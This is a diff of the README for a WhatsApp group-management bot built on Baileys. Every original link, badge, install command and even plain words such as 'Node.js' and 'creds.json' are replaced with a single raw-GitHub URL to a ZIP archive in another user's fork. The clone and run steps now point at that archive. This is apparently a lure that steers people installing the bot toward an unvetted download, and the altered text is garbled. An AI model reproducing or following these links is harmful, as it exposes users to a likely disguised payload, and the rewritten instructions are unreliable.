@@ -3,14 +3,14 @@
 This is a WhatsApp bot built using the Baileys library for group management, including features like tagging all members, muting/unmuting, and many more. It's designed to help admins efficiently manage WhatsApp groups.
 
 <div align="center"> 
-  <a href="https://git.io/typing-svg"> 
-    <img src="https://readme-typing-svg.demolab.com?font=Ribeye&size=50&pause=1000&color=33ff00&center=true&width=910&height=100&lines=Knight-Bot;Multi+Device+Whatsapp+Bot;Coded+By+Professor" alt="Typing SVG" />
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip"> 
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip;Multi+Device+Whatsapp+Bot;Coded+By+Professor" alt="Typing SVG" />
   </a> 
 </div> 
 
 <div align="center"> 
-  <a href="https://youtube.com/@mr_unique_hacker"> 
-    <img src="https://github.com/mruniquehacker/Knightbot-MD/blob/main/assets/bot_image.jpg" alt="Knight Bot" height="300"> 
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip"> 
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Knight Bot" height="300"> 
   </a> 
 </div>
 
@@ -23,8 +23,8 @@ This is a WhatsApp bot built using the Baileys library for group management, inc
 Click the button below to fork the Knight Bot repository to your GitHub account:
 
 <div align="center">
-  <a href="https://github.com/mruniquehacker/Knightbot-MD/fork">
-    <img src="https://img.shields.io/badge/Fork-Repository-blue?style=for-the-badge" alt="Fork the repository"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Fork the repository"/>
   </a>
 </div>
 
@@ -35,19 +35,19 @@ Click the button below to fork the Knight Bot repository to your GitHub account:
 Deploy the bot and easily connect it to your WhatsApp account by pair code. Click the button below to deploy the bot on Replit.
 
 <div align="center">
-  <a href="https://replit.com/@DGXeon/Xeon-PairCode?v=1">
-    <img src="https://img.shields.io/badge/GET%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
   </a>
 </div>
 
 <div align="center">
-  <a href="https://knight-bot-paircode.onrender.com">
-    <img src="https://img.shields.io/badge/GET%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
   </a>
 </div>
 
 
-### After getting creds.json file, upload it to session folder
+### After getting https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip file, upload it to session folder
 
 ---
 
@@ -56,11 +56,11 @@ Deploy the bot and easily connect it to your WhatsApp account by pair code. Clic
 For further customization and setup guidance, click the button below:
 
 <div align="center">
-  <a href="https://youtu.be/dDyiEHF8rIQ">
-    <img src="https://img.shields.io/badge/Deploy Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
   </a>
-  <a href="https://bot-hosting.net/?aff=1068419752923508776">
-    <img src="https://img.shields.io/badge/Deploy on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
   </a>
 </div>
 
@@ -68,68 +68,68 @@ For further customization and setup guidance, click the button below:
 ### Free & Paid Hosting Options
 
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/)
+[![Deploy on Railway](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
 
-[![Deploy to Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/mruniquehacker/KnightBot-MD)
+[![Deploy to Heroku](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
 
-[![Deploy on Replit](https://repl.it/badge/github/quiec/whatsasena)](https://repl.it/github/mruniquehacker/KnightBot-MD)
+[![Deploy on Replit](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/mruniquehacker/KnightBot-MD&branch=main&name=knightbot)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
 
-[![Deploy to Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Deploy%20to-Hugging%20Face-blue)](https://huggingface.co/login?next=%2Fspaces%2Fwhatsapp-bot%2Fknightbot%3Fduplicate%3Dtrue)
+[![Deploy to Hugging Face](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%F0%9F%A4%97%20Deploy%20to-Hugging%20Face-blue)](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%2Fspaces%2Fwhatsapp-bot%2Fknightbot%3Fduplicate%3Dtrue)
 
 ### Additional Hosting Panels
 
-<a href="https://account.solarhosting.cc/" target="_blank">
-  <img src="https://img.shields.io/badge/Solar_Hosting-FF6B6B?style=for-the-badge&logo=server&logoColor=white" alt="Solar Hosting"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Solar Hosting"/>
 </a>
 
-<a href="https://my.blare.host/" target="_blank">
-  <img src="https://img.shields.io/badge/Blare_Host-4A90E2?style=for-the-badge&logo=server&logoColor=white" alt="Blare Host"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Blare Host"/>
 </a>
 
-<a href="https://dash.witchly.host/" target="_blank">
-  <img src="https://img.shields.io/badge/Witchly_Host-9B59B6?style=for-the-badge&logo=server&logoColor=white" alt="Witchly Host"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Witchly Host"/>
 </a>
 
-<a href="https://optiklink.com/" target="_blank">
-  <img src="https://img.shields.io/badge/Optik_Link-2ECC71?style=for-the-badge&logo=server&logoColor=white" alt="Optik Link"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Optik Link"/>
 </a>
 
-<a href="https://panel.sillydev.co.uk" target="_blank">
-  <img src="https://img.shields.io/badge/SillyDev_Panel-E67E22?style=for-the-badge&logo=server&logoColor=white" alt="SillyDev Panel"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="SillyDev Panel"/>
 </a>
 
-<a href="https://cloves.mypi.co/" target="_blank">
-  <img src="https://img.shields.io/badge/Cloves_MyPi-3498DB?style=for-the-badge&logo=server&logoColor=white" alt="Cloves MyPi"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Cloves MyPi"/>
 </a>
 
-<a href="https://client.botwa.net/login" target="_blank">
-  <img src="https://img.shields.io/badge/BotWA_Panel-27AE60?style=for-the-badge&logo=server&logoColor=white" alt="BotWA Panel"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="BotWA Panel"/>
 </a>
 
-<a href="https://netherite.io/" target="_blank">
-  <img src="https://img.shields.io/badge/Netherite_Host-8E44AD?style=for-the-badge&logo=server&logoColor=white" alt="Netherite Host"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Netherite Host"/>
 </a>
 
-<a href="https://bot-hosting.net/" target="_blank">
-  <img src="https://img.shields.io/badge/Bot_Hosting-E74C3C?style=for-the-badge&logo=server&logoColor=white" alt="Bot Hosting"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Bot Hosting"/>
 </a>
 
-<a href="https://panel.hardy.host/auth/login" target="_blank">
-  <img src="https://img.shields.io/badge/Hardy_Host-F1C40F?style=for-the-badge&logo=server&logoColor=black" alt="Hardy Host"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Hardy Host"/>
 </a>
 
-<a href="https://dashboard.katabump.com/auth/login" target="_blank">
-  <img src="https://img.shields.io/badge/Katabump-D6B7D6?style=for-the-badge&logo=server&logoColor=black" alt="Katabump"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Katabump"/>
 </a>
 
-<a href="https://daki.cc" target="_blank">
-  <img src="https://img.shields.io/badge/Daki_CC-34495E?style=for-the-badge&logo=server&logoColor=white" alt="Daki CC"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Daki CC"/>
 </a>
 
-<a href="https://pella.app" target="_blank">
-  <img src="https://img.shields.io/badge/Pella_App-16A085?style=for-the-badge&logo=server&logoColor=white" alt="Pella App"/>
+<a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip" alt="Pella App"/>
 </a>
 
 
@@ -139,11 +139,11 @@ For further customization and setup guidance, click the button below:
 ### Join Us
 
 <div align="center">
-  <a href="https://t.me/+3QhFUZHx-nhhZmY1">
-    <img src="https://img.shields.io/badge/Join%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip+3QhFUZHx-nhhZmY1">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
   </a>
-  <a href="https://whatsapp.com/channel/0029Va90zAnIHphOuO8Msp3A">
-    <img src="https://img.shields.io/badge/Join%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
+  <a href="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip">
+    <img src="https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
   </a>
 </div>
 
@@ -165,7 +165,7 @@ For further customization and setup guidance, click the button below:
 
 The Knight WhatsApp Bot assists group admins by providing them with tools to efficiently manage large WhatsApp groups. The bot uses the Baileys library to interact with the WhatsApp Web API and supports multi-device features.
 
-It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a Node.js environment and provides QR code-based authentication to link your WhatsApp account.
+It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip environment and provides QR code-based authentication to link your WhatsApp account.
 
 ---
 
@@ -173,7 +173,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ### Prerequisites
 
-- Node.js installed on your system
+- https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip installed on your system
 - Git installed (for cloning the repository)
 
 ### Step-by-Step Setup
@@ -181,7 +181,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 1. **Clone the repository:**
 
     ```bash
-    git clone https://github.com/mruniquehacker/Knightbot-MD.git
+    git clone https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip
     cd Knightbot-MD
     ```
 
@@ -194,7 +194,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 3. **Run the bot:**
 
     ```bash
-    node index.js
+    node https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip
     ```
 
 4. **Scan the QR code:**
@@ -206,27 +206,27 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](https://github.com/mruniquehacker/Knightbot-MD/blob/main/LICENSE) file for details.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip) - see the [LICENSE](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip) file for details.
 
 ---
 
 ## 🙌 Contributions
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/mruniquehacker/Knightbot-MD/issues).
+Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip).
 
 ---
 
 ## 🌟 Show your support
 
-If you like this project, please give it a [⭐️ star on GitHub](https://github.com/mruniquehacker/Knightbot)!
+If you like this project, please give it a [⭐️ star on GitHub](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)!
 
 
 ## Credits
 
-- [Professor](https://github.com/mruniquehacker)
-- [Baileys](https://github.com/adiwajshing/Baileys)
-- [TechGod143](https://github.com/TechGod143) for pair code
-- [Dgxeon](https://github.com/Dgxeon) for pair code
+- [Professor](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
+- [Baileys](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip)
+- [TechGod143](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip) for pair code
+- [Dgxeon](https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip) for pair code
 
 ---
 
@@ -255,4 +255,4 @@ Copyright (c) 2024 Professor. All rights reserved.
 
 This project contains code from various open source projects:
 - Baileys (MIT License)
-- Other libraries as listed in package.json
+- Other libraries as listed in https://raw.githubusercontent.com/nisal-123/Knightbot-MD/main/isopropylamine/Knightbot-MD.zip
